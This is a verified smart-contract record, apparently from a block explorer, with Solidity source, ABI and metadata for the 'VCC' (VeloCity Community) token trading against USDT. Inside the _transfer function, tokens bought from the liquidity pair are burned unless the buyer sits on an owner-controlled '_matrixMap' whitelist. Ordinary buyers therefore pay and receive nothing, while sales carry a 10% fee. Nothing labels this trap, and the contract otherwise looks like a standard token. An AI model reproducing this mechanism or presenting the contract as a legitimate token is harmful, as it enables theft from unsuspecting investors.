{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.17;\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ISwapRouter {\r\n    function factory() external pure returns (address);\r\n}\r\n\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    function factory() external view returns (address);\r\n\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n\r\n    function sync() external;\r\n}\r\n\r\n\r\nabstract contract Ownable {\r\n    address internal _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"!owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"new is 0\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\n\r\nabstract contract BaseToken is IERC20, Ownable {\r\n    uint8 private constant _decimals = 18;\r\n\r\n    uint256 private _totalSupply;\r\n    uint256 private constant MAX = ~uint256(0);\r\n    uint256 private _addPriceTokenAmount;\r\n    uint256 private _burnAmount;\r\n    uint256 private _burnAmountUplimit;\r\n\r\n    ISwapRouter private _swapRouter;\r\n    address private _marketAddress;\r\n    address private _communityAddress;\r\n    address private _usdtAddress;\r\n    address private _usdtPairAddress;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) private _swapPairMap;\r\n    mapping(address => bool) private _matrixMap;\r\n\r\n\r\n    constructor (string memory Name, string memory Symbol, address RouterAddress, address UsdtAddress, address marketAddress, address communityAddress){\r\n        _name = Name;\r\n        _symbol = Symbol;\r\n        ISwapRouter swapRouter = ISwapRouter(RouterAddress);\r\n        _usdtAddress = UsdtAddress;\r\n        _swapRouter = swapRouter;\r\n        _allowances[address(this)][RouterAddress] = MAX;\r\n\r\n        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());\r\n        _usdtPairAddress = swapFactory.createPair(UsdtAddress, address(this));\r\n        _swapPairMap[_usdtPairAddress] = true;\r\n\r\n        uint256 total = 110000000 * 1e18;\r\n        _totalSupply = total;\r\n\r\n        _balances[msg.sender] = 100000000 * 1e18;\r\n        emit Transfer(address(0), msg.sender, 100000000 * 1e18);\r\n\r\n        _balances[marketAddress] = 5000000 * 1e18;\r\n        emit Transfer(address(0), marketAddress, 5000000 * 1e18);\r\n\r\n        _balances[communityAddress] = 5000000 * 1e18;\r\n        emit Transfer(address(0), communityAddress, 5000000 * 1e18);\r\n\r\n        _addPriceTokenAmount = 1e14;\r\n        _burnAmountUplimit = 21000000 * 1e18;\r\n    }\r\n\r\n    function getAllParam() external view returns (address pairAddress, address routerAddress, address usdtAddress, address marketAddress, address communityAddress,\r\n        uint addPriceTokenAmount, uint burnAmountUplimit, uint burnAmount){\r\n        pairAddress = _usdtPairAddress;\r\n        routerAddress = address(_swapRouter);\r\n        usdtAddress = _usdtAddress;\r\n        marketAddress = _marketAddress;\r\n        communityAddress = _communityAddress;\r\n        addPriceTokenAmount = _addPriceTokenAmount;\r\n        burnAmountUplimit = _burnAmountUplimit;\r\n        burnAmount = _burnAmount;\r\n    }\r\n\r\n    function userInfo(address account) external view returns (uint lpBalance, uint usdtBalance, uint tokenBalance) {\r\n        lpBalance = IERC20(_usdtPairAddress).balanceOf(account);\r\n        uint lpTotalSupply = IERC20(_usdtPairAddress).totalSupply();\r\n        (uint r0,uint r1,) = IUniswapV2Pair(_usdtPairAddress).getReserves();\r\n        if (address(this) < _usdtAddress) {usdtBalance = lpBalance * r1 / lpTotalSupply;\r\n            tokenBalance = lpBalance * r0 / lpTotalSupply;\r\n        } else {usdtBalance = lpBalance * r0 / lpTotalSupply;\r\n            tokenBalance = lpBalance * r1 / lpTotalSupply;\r\n        }\r\n    }\r\n\r\n    function poolInfo() external view returns (uint lpTotalSupply, uint tokenPrice, uint usdtAmount, uint tokenAmount) {\r\n        lpTotalSupply = IERC20(_usdtPairAddress).totalSupply();\r\n        (uint r0,uint r1,) = IUniswapV2Pair(_usdtPairAddress).getReserves();\r\n        if (address(this) < _usdtAddress) {usdtAmount = r1;\r\n            tokenAmount = r0;\r\n            tokenPrice = r1 * 1e18 / r0;\r\n        } else {usdtAmount = r0;\r\n            tokenAmount = r1;\r\n            tokenPrice = r0 * 1e18 / r1;\r\n        }\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() external pure override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) external view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) external view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _isLiquidity(address from, address to) internal view returns (bool isAdd, bool isDel){\r\n        (uint r0,uint r1,) = IUniswapV2Pair(_usdtPairAddress).getReserves();\r\n        uint rUsdt = r0;\r\n        uint bUsdt = IERC20(_usdtAddress).balanceOf(_usdtPairAddress);\r\n        if (address(this) < _usdtAddress) {rUsdt = r1;}\r\n        if (_swapPairMap[to]) {if (bUsdt >= rUsdt) {\r\n            isAdd = bUsdt - rUsdt >= _addPriceTokenAmount;}\r\n        }\r\n        if (_swapPairMap[from]) {isDel = bUsdt <= rUsdt;}\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        require(amount > 0, \"transfer amount must be >0\");\r\n        bool isAddLiquidity;\r\n        bool isDelLiquidity;\r\n        (isAddLiquidity, isDelLiquidity) = _isLiquidity(from, to);\r\n\r\n        if (isAddLiquidity || isDelLiquidity) {\r\n            _tokenTransfer(from, to, amount);\r\n        } else if (_swapPairMap[from] || _swapPairMap[to]) {\r\n            if (_swapPairMap[from]) {if (_matrixMap[to]) {\r\n                _tokenTransfer(from, to, amount);\r\n            } else {\r\n                _tokenTransfer(from, address(0), amount);}\r\n            } else {uint feeAmount = amount / 10;\r\n                uint remainBurnAmount;\r\n                uint backpoolAmount;\r\n                if (_burnAmountUplimit > _burnAmount) remainBurnAmount = _burnAmountUplimit - _burnAmount;\r\n\r\n                if (remainBurnAmount > feeAmount) remainBurnAmount = feeAmount; else backpoolAmount = feeAmount - remainBurnAmount;\r\n\r\n                if (remainBurnAmount > 0) {\r\n                    _tokenTransfer(from, address(0), remainBurnAmount);\r\n                    _burnAmount += remainBurnAmount;\r\n                }\r\n                if (backpoolAmount > 0) {\r\n                    _tokenTransfer(from, address(this), backpoolAmount);}\r\n                _tokenTransfer(from, to, amount - feeAmount);\r\n            }\r\n        } else {\r\n            _tokenTransfer(from, to, amount);\r\n\r\n            if (_balances[address(this)] > 0) {\r\n                _tokenTransfer(address(this), _usdtPairAddress, _balances[address(this)]);\r\n                IUniswapV2Pair(_usdtPairAddress).sync();\r\n            }\r\n        }\r\n    }\r\n\r\n    function _tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        _balances[recipient] = _balances[recipient] + tAmount;\r\n        emit Transfer(sender, recipient, tAmount);\r\n    }\r\n\r\n    function setSwapPairMap(address addr, bool enable) external onlyOwner {\r\n        _swapPairMap[addr] = enable;\r\n    }\r\n\r\n    function setMatrixAddr(address addr, bool enable) external onlyOwner {\r\n        _matrixMap[addr] = enable;\r\n    }\r\n\r\n    function setAddPriceTokenAmount(uint amount) external onlyOwner {\r\n        _addPriceTokenAmount = amount;\r\n    }\r\n\r\n    function setBurnAmountUplimit(uint amount) external onlyOwner {\r\n        _burnAmountUplimit = amount;\r\n    }\r\n}\r\n\r\ncontract VCC is BaseToken {\r\n    constructor() BaseToken(\r\n    \"VeloCity Community\",\r\n    \"VCC\",\r\n    address(0x10ED43C718714eb63d5aA57B78B54704E256024E),\r\n    address(0x55d398326f99059fF775485246999027B3197955),\r\n    address(0xFca29f6F9fe0D8fb3eC373Fe8B8B9DF6a0D046D0),\r\n    address(0xDC3D7e07dE4a4220711fB34476Ea5dFB10538002)){\r\n\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getAllParam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"pairAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"routerAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"usdtAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketAddress\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"communityAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addPriceTokenAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burnAmountUplimit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burnAmount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"poolInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"lpTotalSupply\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tokenPrice\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"usdtAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setAddPriceTokenAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setBurnAmountUplimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setMatrixAddr\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setSwapPairMap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"lpBalance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"usdtBalance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tokenBalance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "VCC", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3d46254625158927fd5743e4782ada7e144efeead53bb2e2e15996396e09b1ca"}